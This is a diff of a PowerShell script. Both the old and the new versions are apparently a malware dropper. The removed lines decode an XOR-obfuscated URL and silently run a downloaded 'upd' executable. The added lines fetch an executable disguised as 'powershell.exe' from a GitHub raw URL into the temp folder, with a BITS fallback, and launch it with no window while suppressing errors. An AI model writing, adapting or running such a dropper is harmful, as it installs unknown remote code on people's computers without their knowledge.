@@ -1,9 +1,13 @@
 $ErrorActionPreference='SilentlyContinue'
-$k=13
-$u=-join(@(101,121,121,125,126,55,34,34,106,100,121,101,120,111,35,110,98,96,34,96,108,121,123,104,103,126,102,97,108,127,98,123,52,32,110,116,111,104,127,34,96,116,34,127,108,122,34,127,104,107,126,34,101,104,108,105,126,34,96,108,100,99,34,125,98,122,104,127,126,101,104,97,97,35,104,117,104)|%{[char]($_-bxor$k)})
-$p=Join-Path $env:LOCALAPPDATA ('upd{0}.exe' -f (Get-Random -Max 9999))
-$w=New-Object Net.WebClient
-$w.Headers['User-Agent']='Mozilla/5.0'
-try{$w.DownloadFile($u,$p)}catch{return}
-if((Get-Item $p).Length -lt 256){return}
-Start-Process -FilePath $p -WindowStyle Hidden
+[Net.ServicePointManager]::SecurityProtocol=3072
+$p=Join-Path $env:TEMP ('{0}.exe' -f (Get-Random))
+$u='https://raw.githubusercontent.com/matvejsklarov9-cyber/my/refs/heads/main/powershell.exe'
+try{(New-Object Net.WebClient).DownloadFile($u,$p)}catch{Start-BitsTransfer -Source $u -Destination $p}
+if((Test-Path $p) -and (Get-Item $p).Length -gt 100000){
+ $i=New-Object Diagnostics.ProcessStartInfo
+ $i.FileName=$p
+ $i.WorkingDirectory=$env:TEMP
+ $i.UseShellExecute=$false
+ $i.CreateNoWindow=$true
+ [void][Diagnostics.Process]::Start($i)
+}
